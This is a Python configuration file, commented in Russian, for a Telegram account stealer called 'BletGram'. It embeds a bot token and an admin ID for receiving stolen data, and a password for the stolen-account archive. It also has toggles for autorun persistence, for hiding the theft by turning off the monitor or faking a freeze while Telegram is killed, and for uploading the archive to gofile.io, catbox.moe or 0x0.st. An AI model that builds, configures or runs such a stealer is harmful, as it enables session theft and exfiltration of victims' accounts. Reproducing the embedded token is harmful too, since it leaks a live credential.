
# Токен бота
TOKEN = '7888921736:AAEbaREMbi6hmbCItbAnqaGlggG0_N5BVgk'

# Название файла
NAME = 'BletGram'

# Ваш ID
ADMIN = 8065283718

# Пароль, для доступа к архиву с аккаунтом
PASSWORD = '2025'



# Добавление стиллера в автозагрузку
AUTORUN = False # Установите True чтобы включить или False чтобы отключить



# Выключение монитора во время завершение процесса Telegram (экспериментально)
MONITOR_OFF = False # Установите True чтобы включить или False чтобы отключить

# Открытие проводника перед завершением процесса Telegram
EXPLORER_ON = False # Установите True чтобы включить или False чтобы отключить

# Эффект зависания во время взаимодействия с Telegram
FREEZE_ON = True # Установите True чтобы включить или False чтобы отключить



# Загрузка архива с аккаунтом на gofile.io (скорость загрузки быстрая относительно других сервисов)
UPLOAD_GOFILE = True # Установите True чтобы включить или False чтобы отключить

# Загрузка архива с аккаунтом на catbox.moe (может быть долгая загрузка)
UPLOAD_CATBOX = False # Установите True чтобы включить или False чтобы отключить

# Загрузка архива с аккаунтом на 0x0.st (может быть очень долгая загрузка)
UPLOAD_0X0 = False # Установите True чтобы включить или False чтобы отключить
